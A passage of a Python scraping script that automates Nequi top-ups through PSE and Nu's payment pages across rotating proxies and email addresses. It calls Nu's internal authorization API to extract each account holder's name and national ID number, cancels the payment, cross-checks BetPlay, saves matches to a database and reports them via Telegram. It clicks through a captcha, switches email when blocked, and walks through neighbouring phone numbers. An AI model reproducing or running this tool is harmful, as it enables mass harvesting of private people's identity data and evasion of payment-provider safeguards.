            if (window.userdata && window.userdata.Success) {
                window.userquestionanswer = {Success: true, EnableWithoutRegister: false};
                if (typeof redirectToBank === 'function') {
                    redirectToBank(false);
                    return {ok: true, path: 'api'};
                }
            }
        }
    } catch (e) {}
    const btnSeguir = document.getElementById('btnSeguir') || document.getElementById('btnSeguir2');
    if (btnSeguir) { btnSeguir.click(); return {ok: true, path: 'click'}; }
    return {ok: false, error: 'no se pudo disparar el flujo'};
}
"""

JS_PSE_ESTADO = """
() => {
    const out = {url: location.href, titulo: document.title};
    try { out.authname = (window.prefs && window.prefs.AuthName) || null; } catch(e) { out.authname = null; }
    try { out.userdata = window.userdata || null; } catch(e) { out.userdata = null; }
    try { out.pnemail = (document.getElementById('PNEMail')||{}).value || null; } catch(e) {}
    try { out.visibles = Array.from(document.querySelectorAll('button, input[type=submit]'))
            .filter(b => b.offsetParent !== null)
            .map(b => (b.innerText || b.value || b.id || '').trim())
            .filter(Boolean).slice(0, 15); } catch(e) { out.visibles = []; }
    return out;
}
"""

JS_BLOQUEO = """
() => {
    const t = (document.body ? document.body.innerText : '').toLowerCase();
    if (t.includes('correo bloqueado')) return true;
    if (t.includes('no se pueden realizar pagos con este correo')) return true;
    try {
        const h = document.querySelector('h2.alert-title');
        if (h && h.innerText.toLowerCase().includes('bloqueado')) return true;
    } catch (e) {}
    return false;
}
"""


async def pse_esta_bloqueado(page) -> bool:
    try:
        return bool(await page.evaluate(JS_BLOQUEO))
    except Exception:
        try:
            t = (await leer_texto(page)).lower()
            return "correo bloqueado" in t or "no se pueden realizar pagos" in t
        except Exception:
            return False


JS_NU_DETALLES = """
async (authId) => {
    const r = await fetch('https://prod-global-global-hadou.prod-waf.nu.com.co/api/authorization/details-web', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({id: auth_id})
    });
    return await r.json();
}
"""

JS_NU_CANCELAR = """
async (authId) => {
    const r = await fetch('https://prod-global-global-hadou.prod-waf.nu.com.co/api/cancel-payment-web', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({'authorization-id': auth_id})
    });
    return await r.json();
}
"""


def _buscar_valor(obj, claves):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in claves and isinstance(v, (str, int)) and str(v).strip():
                return str(v)
            r = _buscar_valor(v, claves)
            if r:
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = _buscar_valor(v, claves)
            if r:
                return r
    return None


NU_HADOU = "https://prod-global-global-hadou.prod-waf.nu.com.co/api"


async def nu_api_procesar(auth_id: str) -> Optional[Dict]:
    session = aiohttp.ClientSession(
        timeout=ClientTimeout(total=20),
        headers={"user-agent": UA_BROWSER,
                 "accept": "application/json",
                 "content-type": "application/json",
                 "origin": "https://pagos.nu.com.co",
                 "referer": "https://pagos.nu.com.co/"})
    try:
        async with session.post(f"{NU_HADOU}/authorization/details-web",
                                json={"id": auth_id}) as r:
            detalles = await r.json(content_type=None)
        ref3 = _buscar_valor(detalles, ("ref3",))
        try:
            payer = detalles["authorization"]["authorization_request"]\
                          ["liquidation_method"]["options"]["payer"]
        except Exception:
            payer = {}
        try:
            async with session.post(f"{NU_HADOU}/cancel-payment-web",
                                    json={"authorization-id": auth_id}) as r:
                await r.read()
        except Exception:
            pass
        if ref3:
            return {"ref3": ref3, "payer": payer if isinstance(payer, dict) else {}}
        return None
    except Exception as e:
        print(f"[api-nu] Error: {type(e).__name__}: {e}")
        return None
    finally:
        await session.close()


def buscar_campo(data, claves):
    if isinstance(data, dict):
        for k, v in data.items():
            if isinstance(v, (str, int)) and any(c in str(k).lower() for c in claves) and str(v).strip():
                return str(v)
        for v in data.values():
            r = buscar_campo(v, claves)
            if r:
                return r
    elif isinstance(data, list):
        for v in data:
            r = buscar_campo(v, claves)
            if r:
                return r
    return ""


def telefono_coincide(celular: str, tel_betplay: str) -> bool:
    tel_digits = re.sub(r"\D", "", str(tel_betplay))
    if len(tel_digits) < 6:
        return False
    return tel_digits[:3] == celular[:3] and tel_digits[-3:] == celular[-3:]


async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
    print(f"[?] {celular} probando referencia {referencia} en BetPlay...")
    checker = BetplayChecker()
    if not await checker.init_session():
        print("[!] No se pudo conectar a BetPlay")
        return False

    db = SessionLocal()
    try:
        valido, datos = await checker.verificar_documento(referencia)
        print(f"[i] {celular} JSON BetPlay: {json.dumps(datos, ensure_ascii=False)[:400]}")
        if not valido:
            print(f"[NO] {celular} referencia {referencia} no registrada en BetPlay")
            return False

        tel = buscar_campo(datos, ("phone", "cel", "tel", "movil", "mobile"))
        if not tel:
            print(f"[~] {celular} ref {referencia} registrada pero sin teléfono en el JSON")
            return False

        if telefono_coincide(celular, tel):
            existente = db.query(FoundNumber).filter(FoundNumber.celular == celular).first()
            if existente:
                print(f"[EXISTENTE DB] celular {celular} ya guardado anteriormente.")
                return True
            nuevo_registro = FoundNumber(celular=celular, ref3=referencia,
                                         nombre=nombre, cedula=cedula)
            try:
                db.add(nuevo_registro)
                db.commit()
                db.refresh(nuevo_registro)
            except IntegrityError:
                db.rollback()
                print(f"[EXISTENTE DB] {celular} insertado por otro worker.")
                return True
            _marcar_usado(celular)
            print(f"[EXISTENTE DB] ref {referencia} -> {celular} GUARDADO")
            await tg.notificar_guardado(celular, referencia, nombre)
            return True
        else:
            print(f"[~] {celular} ref {referencia} existe pero teléfono no coincide (tel {tel})")
            return False
    finally:
        await checker.close()
        db.close()


async def _buscar_pagina(context, patron):
    for pg in context.pages:
        try:
            if patron in pg.url:
                return pg
        except Exception:
            pass
    return None


async def _esperar_pagina(context, patron, timeout=30):
    fin = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < fin:
        pg = await _buscar_pagina(context, patron)
        if pg:
            return pg
        await asyncio.sleep(0.3)
    return None


async def ejecutar(celular, proxy=None):
    """'ok' | 'sin_cuenta' | 'bloqueo' | 'sin_ref' | 'correo_agotado' | 'correo_bloqueado' | 'error'"""
    proxy = preparar_proxy(proxy)
    correo = correo_actual()
    capturado = {"put": None}

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=not MOSTRAR_VENTANA,
            slow_mo=SLOW_MO,
            proxy=proxy,
            args=["--disable-gpu", "--no-sandbox", "--disable-dev-shm-usage"]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 900}, user_agent=UA_BROWSER)
        page = await context.new_page()

        await page.route("**/*", lambda route:
            route.abort() if route.request.resource_type in ["image", "font", "media"]
            else route.continue_())

        async def _on_response(resp):
            try:
                if "cashin-orchestrator" in resp.url and resp.request.method == "PUT":
                    capturado["put"] = await resp.json()
            except Exception:
                pass

        page.on("response", lambda r: asyncio.ensure_future(_on_response(r)))

        try:
            print(f"\n[*] {celular} procesando (correo {correo})...")
            await _goto_con_retry(page, "https://clientes.nequi.com.co/recargas")

            await page.wait_for_selector('input#phoneNumber', timeout=25000)
            await page.locator('input#phoneNumber').fill(celular)
            await page.locator('input#confirmPhoneNumber').fill(celular)
            await page.locator('input#transactionValue').fill("1000")

            await page.keyboard.press("Tab")
            await page.keyboard.press("Tab")
            await page.keyboard.press("Enter")
            await page.keyboard.type("Nu", delay=120)
            await page.keyboard.press("Enter")
            await page.keyboard.press("Tab")

            try:
                captcha = page.locator('.mosparo__checkbox')
                await captcha.wait_for(state="visible", timeout=12000)
                await captcha.click(force=True)
            except Exception:
                pass

            await clic_inmediato(page, "Continuar", timeout=10000)

            resultado = await resolver_paso_nequi(page, context, timeout=25000)

            if resultado == "sin_cuenta":
                print(f"[!] {celular} marcado como NO existente -> siguiente")
                await clic_si_existe(page, "Continuar", timeout=3000)
                return "sin_cuenta"
            if resultado == "bloqueo":
                print(f"[!] Bloqueo Nequi {celular}")
                return "bloqueo"
            if resultado == "timeout":
                print(f"[!] {celular} sin respuesta clara -> siguiente")
                await dump_paginas(context, "tras-timeout")
                await screenshot(page, f"{celular}_timeout_nequi")
                return "error"

            for _ in range(20):
                if capturado["put"] is not None:
                    break
                await page.wait_for_timeout(250)
            if capturado["put"] is not None:
                print(f"[i] {celular} PUT COMPLETO: {json.dumps(capturado['put'], ensure_ascii=False)}")

            page_pse = await _esperar_pagina(context, "pse.com.co", timeout=30)
            if not page_pse:
                print(f"[!] {celular} no llegó a PSE")
                await dump_paginas(context, "sin-pse")
                await screenshot(page, f"{celular}_sin_pse")
                return "sin_ref"

            m = re.search(r'[?&]enc=([^&]+)', page_pse.url)
            if not m:
                print(f"[!] {celular} PSE sin enc en la URL")
                await dump_paginas(context, "pse-sin-enc")
                return "sin_ref"
            print(f"[OK] {celular} llegó a PSE, enc capturado ({len(m.group(1))} chars)")

            try:
                res_eval = await page_pse.evaluate(JS_PSE_RAPIDO, correo)
                print(f"[i] {celular} PSE evaluate: {res_eval}")
            except Exception as e:
                print(f"[i] {celular} PSE evaluate falló ({type(e).__name__}) -> clics clásicos")
                await clic_inmediato(page_pse, "Continuar", timeout=10000)
                try:
                    await page_pse.locator('input#PNEMail').fill(correo)
                except Exception:
                    try:
                        await page_pse.locator('input[placeholder*="correo"]').first.fill(correo)
                    except Exception:
                        pass
                await clic_inmediato(page_pse, "Ir al Banco", timeout=10000)

            if DEBUG:
                try:
                    estado = await page_pse.evaluate(JS_PSE_ESTADO)
                    print(f"[DBG] {celular} estado PSE: {json.dumps(estado, ensure_ascii=False)[:800]}")
                except Exception as e:
                    print(f"[DBG] no se pudo leer estado PSE: {e}")

            fin = asyncio.get_event_loop().time() + 40
            page_nu = None
            bloqueado = False
            while asyncio.get_event_loop().time() < fin:
                page_nu = await _buscar_pagina(context, "autorizacion-pse")
                if page_nu:
                    break
                if await pse_esta_bloqueado(page_pse):
                    bloqueado = True
                    break
                await asyncio.sleep(0.4)

            if bloqueado:
                print(f"[!] {celular} -> correo {correo} BLOQUEADO por PSE")
                await screenshot(page_pse, f"{celular}_correo_bloqueado")
                marcar_bloqueado(correo, "correo bloqueado PSE")
                avanzar_correo()
                return "correo_bloqueado"

            if not page_nu:
                try:
                    texto = (await leer_texto(page_pse)).lower()
                    if DEBUG:
                        print(f"[DBG] {celular} texto PSE (600): {texto[:600]!r}")
                    await screenshot(page_pse, f"{celular}_pse_sin_nu")
                    if "codigo unico (cus)" in texto or "código único (cus)" in texto \
                       or "no se pudo realizar" in texto:
                        print(f"[!] CUS: correo {correo} agotado -> cambio")
                        avanzar_correo()
                        return "correo_agotado"
                except Exception:
                    pass
                print(f"[!] {celular} Nu nunca llegó")
                return "sin_ref"

            m = re.search(r"[?&]id=([a-f0-9\-]{20,50})", page_nu.url)
            if not m:
                print(f"[!] {celular} Nu sin id en URL: {page_nu.url[:100]}")
                await screenshot(page_nu, f"{celular}_nu_sin_id")
                return "sin_ref"
            auth_id = m.group(1)

            datos = None
            detalles = None
            try:
                await page_nu.wait_for_timeout(1500)
                detalles = await page_nu.evaluate(JS_NU_DETALLES, auth_id)
                ref3 = _buscar_valor(detalles, ("ref3",))
                if ref3:
                    try:
                        payer = detalles["authorization"]["authorization_request"]\
                                      ["liquidation_method"]["options"]["payer"]
                    except Exception:
                        payer = {}
                    datos = {"ref3": ref3, "payer": payer if isinstance(payer, dict) else {}}
                    try:
                        await page_nu.evaluate(JS_NU_CANCELAR, auth_id)
                    except Exception:
                        pass
            except Exception as e:
                print(f"[i] {celular} fetch interno Nu falló ({type(e).__name__}) -> aiohttp")
                datos = await nu_api_procesar(auth_id)

            if not datos or not datos.get("ref3"):
                print(f"[!] {celular} sin referencia")
                if DEBUG and detalles:
                    try:
                        print(f"[DBG] {celular} detalles Nu: {json.dumps(detalles, ensure_ascii=False)[:800]}")
                    except Exception:
                        pass
                return "sin_ref"

            ref3 = datos["ref3"]
            payer = datos.get("payer") or {}
            nombre = str(payer.get("name", "")).strip()
            cedula = str(payer.get("tax_id", "")).strip()

            print(f"[OK] {celular} -> ref3 {ref3} | {nombre} | CC {cedula}")
            await chequear_y_guardar(celular, ref3, nombre, cedula)
            return "ok"

        except Exception as e:
            print(f"[!] Error {celular}: {type(e).__name__}: {e}")
            traceback.print_exc()
            return "error"
        finally:
            try:
                await context.close()
            except Exception:
                pass
            await browser.close()


async def procesar_un_celular(celular):
    proxys = cargar_proxies() if USAR_PROXY else [None]
    if not proxys:
        proxys = [None]
    random.shuffle(proxys)
    for px in proxys:
        reintentos = 0
        while reintentos < 30:
            estado = await ejecutar(celular, px)
            if estado in ("correo_agotado", "correo_bloqueado"):
                reintentos += 1
                continue
            if estado in ("ok", "sin_ref"):
                return estado
            break
    return "error"


# ======================================================================
#  WORKERS + SUPERVISIÓN
# ======================================================================
intentos_total = 0


async def worker(n):
    global intentos_total
    while True:
        try:
            if LIMITE is not None and intentos_total >= LIMITE:
                return
            celular = siguiente_celular()
            intentos_total += 1
            print(f"\n===== [W{n}] Intento {intentos_total} | celular: {celular} =====")

            try:
                estado = await procesar_un_celular(celular)
            except Exception as e:
                print(f"[W{n}] error {celular}: {e}")
                estado = "error"

            exito = estado in ("ok", "sin_ref")
            try:
                await mem.registrar(celular, exito)
            except Exception as e:
                print(f"[W{n}] error registrando stats: {e}")

            if exito:
                agregar_vecinos(celular)

            if intentos_total % 25 == 0:
                print(f"[mem] Tasa actual: {mem.tasa_acierto()*100:.2f}% "
                      f"({mem.data['aciertos']}/{mem.data['intentos']}) "
                      f"| usados: {contar_usados()} | bloqueados: {contar_bloqueados()}")

            if intentos_total % 500 == 0:
                recargar_usados()

        except asyncio.CancelledError:
            raise
        except Exception:
            traceback.print_exc()
            await asyncio.sleep(1)


async def _worker_supervisado(n):
    while True:
        try:
            await worker(n)
            return
        except Exception:
            traceback.print_exc()
            await asyncio.sleep(2)


async def _poll_supervisado():
    while True:
        try:
            await tg.poll()
            return
        except Exception:
            traceback.print_exc()
            await asyncio.sleep(3)


async def main():
    cargar_correo_guardado()
    ensure_contadores()
    recargar_bloqueados()
    recargar_usados()

    if AUTO_IMPORT or "--import" in sys.argv:
        ejecutar_import()

    arg = None
    for a in sys.argv[1:]:
        if a.isdigit() and len(a) >= 10:
            arg = a
            break
    if arg:
        _marcar_usado(arg)
        _pila_vecinos.appendleft(arg)

    try:
        await tg.start()
    except Exception as e:
        print(f"[!] Error iniciando Telegram: {e}")

    tareas = [asyncio.create_task(flusher_usados())]
    if tg.activo:
        tareas.append(asyncio.create_task(_poll_supervisado()))
        try:
            await tg.actualizar_contador()
        except Exception as e:
            print(f"[!] Error enviando mensaje inicial: {e}")
        print("[i] Telegram activo")
    else:
        print("[i] Telegram desactivado (falta token)")

    print(f"[i] Correo inicial: {correo_actual()}")
    print(f"[i] Tasa histórica: {mem.tasa_acierto()*100:.2f}%")
    print(f"[i] Correos bloqueados: {contar_bloqueados()}")
    print(f"[i] Números usados (DB): {contar_usados()}")
    print(f"[i] Concurrencia: {CONCURRENCIA} | Límite: {LIMITE or 'infinito'}")
    print(f"[i] Cuentas en DB: {contar_existentes()}")
    print(f"[i] DEBUG={DEBUG} | Ventana visible={MOSTRAR_VENTANA}")

    tareas += [asyncio.create_task(_worker_supervisado(i + 1)) for i in range(CONCURRENCIA)]
    await asyncio.gather(*tareas, return_exceptions=True)


if __name__ == "__main__":
    print(">>> INICIANDO CON DB ...")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Detenido por el usuario (Ctrl+C)")
    except Exception:
        traceback.print_exc()
    print(">>> FIN")